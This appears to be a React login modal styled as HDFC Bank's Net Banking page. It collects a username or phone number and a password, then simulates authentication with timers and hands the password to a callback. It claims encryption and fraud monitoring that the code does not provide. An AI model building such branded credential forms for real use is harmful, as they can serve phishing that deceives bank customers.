import { useState, useEffect, useRef } from "react";
import VirtualKeyboard from "./VirtualKeyboard";
import "./LoginModal.css";
import "./LoginModalExtra.css";

function generateCaptcha() {
  const num1 = Math.floor(Math.random() * 10) + 1;
  const num2 = Math.floor(Math.random() * 10) + 1;
  return { num1, num2, answer: (num1 + num2).toString() };
}

export default function LoginModal({ isOpen, onClose, onLogin }) {
  const [showPass, setShowPass] = useState(false);
  const [showKeyboard, setShowKeyboard] = useState(false);
  const [activeTab, setActiveTab] = useState("retail");
  const [status, setStatus] = useState("idle"); // idle | loading | success
  const [form, setForm] = useState({ id: "", phone: "", password: "", captcha: "", remember: false });
  const [captchaChallenge, setCaptchaChallenge] = useState(generateCaptcha());
  const [captchaError, setCaptchaError] = useState(false);
  
  const passwordInputRef = useRef(null);

  useEffect(() => {
    const handler = (e) => { if (e.key === "Escape") onClose(); };
    document.addEventListener("keydown", handler);
    return () => document.removeEventListener("keydown", handler);
  }, [onClose]);

  useEffect(() => {
    document.body.style.overflow = isOpen ? "hidden" : "";
    if (isOpen) {
      setCaptchaChallenge(generateCaptcha());
      setForm({ id: "", phone: "", password: "", captcha: "", remember: false });
      setCaptchaError(false);
      setShowKeyboard(false);
    }
    return () => { document.body.style.overflow = ""; };
  }, [isOpen]);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (form.captcha !== captchaChallenge.answer) {
      setCaptchaError(true);
      setCaptchaChallenge(generateCaptcha());
      setForm({...form, captcha: ""});
      return;
    }
    setCaptchaError(false);
    setStatus("loading");
    setTimeout(() => {
      setStatus("success");
      setTimeout(() => {
        onLogin({ id: form.id || form.phone || "User", password: form.password });
        setStatus("idle");
      }, 1800);
    }, 1500);
  };

  const handleKeyboardPress = (char) => {
    setForm(prev => ({ ...prev, password: prev.password + char }));
    if (passwordInputRef.current) {
        passwordInputRef.current.focus();
    }
  };

  const handleKeyboardBackspace = () => {
    setForm(prev => ({ ...prev, password: prev.password.slice(0, -1) }));
    if (passwordInputRef.current) {
        passwordInputRef.current.focus();
    }
  };

  if (!isOpen) return null;

  return (
    <div className={`modal-overlay${isOpen ? " active" : ""}`} onClick={(e) => e.target === e.currentTarget && onClose()}>
      <div className="modal">
        <button className="modal-close" onClick={onClose}>✕</button>

        {/* Left Panel */}
        <div className="modal-left">
          <div className="modal-brand">
            <div className="modal-logo">
              <span className="logo-h">H</span>DFC
            </div>
            <h2>Net Banking</h2>
            <p>Secure. Fast. Always Available.</p>
          </div>
          <div className="modal-features">
            {[
              "256-bit SSL encryption",
              "Virtual Keyboard Protection",
              "24/7 fraud monitoring",
            ].map((f) => (
              <div key={f} className="mf">
                <span className="mf-check">✓</span> {f}
              </div>
            ))}
          </div>
          <div className="modal-decoration" />
        </div>

        {/* Right Panel */}
        <div className="modal-right">
          <h3>Login to Net Banking</h3>

          <div className="login-tabs">
            {["retail", "corporate"].map((tab) => (
              <button
                key={tab}
                type="button"
                className={`ltab${activeTab === tab ? " active" : ""}`}
                onClick={() => setActiveTab(tab)}
              >
                {tab.charAt(0).toUpperCase() + tab.slice(1)}
              </button>
            ))}
          </div>

          <form className="login-form" onSubmit={handleSubmit}>
            <div className="form-group">
              <label>Username</label>
              <input
                type="text"
                placeholder={activeTab === "retail" ? "Enter Username" : "Enter Corporate ID"}
                value={form.id}
                onChange={(e) => setForm({ ...form, id: e.target.value })}
                required={!form.phone}
              />
            </div>

            <div className="form-group">
              <label>Registered Phone Number</label>
              <input
                type="tel"
                placeholder="Enter 10-digit Phone Number"
                value={form.phone}
                onChange={(e) => setForm({ ...form, phone: e.target.value })}
                required={!form.id}
              />
            </div>

            <div className="form-group" style={{position: 'relative'}}>
              <label>Password</label>
              <div className="password-wrap">
                <input
                  ref={passwordInputRef}
                  type={showPass ? "text" : "password"}
                  placeholder="Enter your Password"
                  value={form.password}
                  onChange={(e) => setForm({ ...form, password: e.target.value })}
                  required
                />
                <button type="button" className="toggle-pass vk-btn" style={{marginRight: '8px', fontSize: '18px'}} onClick={() => setShowKeyboard(!showKeyboard)} title="Virtual Keyboard">
                  ⌨️
                </button>
                <button type="button" className="toggle-pass" onClick={() => setShowPass(!showPass)}>
                  {showPass ? "🙈" : "👁️"}
                </button>
              </div>
              <VirtualKeyboard 
                isVisible={showKeyboard} 
                onClose={() => setShowKeyboard(false)} 
                onKeyPress={handleKeyboardPress} 
                onBackspace={handleKeyboardBackspace}
              />
            </div>

            <div className="form-group captcha-group">
                <label>Security Check</label>
                <div className="captcha-wrap">
                   <div className="captcha-box">{captchaChallenge.num1} + {captchaChallenge.num2} = ?</div>
                   <input 
                     type="text" 
                     placeholder="Answer"
                     value={form.captcha}
                     onChange={(e) => setForm({ ...form, captcha: e.target.value })}
                     required
                   />
                </div>
                {captchaError && <span className="captcha-error">Incorrect answer. Try again.</span>}
            </div>

            <div className="form-row">
              <label className="checkbox-label">
                <input
                  type="checkbox"
                  checked={form.remember}
                  onChange={(e) => setForm({ ...form, remember: e.target.checked })}
                />
                Remember me
              </label>
              <a href="#" className="forgot">Forgot Password?</a>
            </div>

            <button
              type="submit"
              className={`btn-login-submit${status === "success" ? " success" : ""}`}
              disabled={status === "loading" || status === "success"}
            >
              {status === "idle" && "Login Securely →"}
              {status === "loading" && (
                <span className="spinner-wrap">
                  <span className="spinner" /> Authenticating...
                </span>
              )}
              {status === "success" && "✓ Login Successful!"}
            </button>

            <div className="register-link">
              New user? <a href="#">Register for Net Banking</a>
            </div>

            <div className="modal-disclaimer">
              <p>🔒 Your session is protected with end-to-end encryption. HDFC Bank will never ask for your password via phone or email.</p>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
